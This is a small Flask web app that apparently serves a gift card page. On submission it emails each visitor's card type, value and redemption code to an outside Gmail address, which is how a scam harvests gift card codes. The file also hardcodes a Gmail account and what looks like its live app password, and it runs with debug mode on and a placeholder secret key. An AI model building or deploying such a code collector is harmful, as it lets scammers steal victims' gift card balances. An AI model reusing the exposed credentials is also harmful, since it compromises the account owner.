from flask import Flask, render_template, request, flash, redirect, url_for, session, abort, jsonify, send_file

from flask_mail import Mail, Message

app = Flask(__name__)

mail = Mail(app)

app.config["DEBUG"] = True
app.config['SECRET_KEY'] = 'SECRET_KEY'

app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
app.config['MAIL_PASSWORD'] = 'rwqdpqnsosdahvjf'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'olamicreas@gmail.com'
mail = Mail(app)




@app.route('/', methods=['GET', 'POST'])
def home():
	if request.method == 'POST':
		card = request.form['card']
		cash = request.form['cash']
		amount = request.form['amount']
		redem = request.form['redem']
		msg = Message(card, sender = 'olamicreas@gmail.com', recipients = ['Geniusdullard01@gmail.com'] )
		msg.body = f'cash= {cash}, amount= {amount}, redemption code {redem} '
		mail.send(msg)

	return render_template('giftcard.html')





if __name__ == "__main__":
	app.run()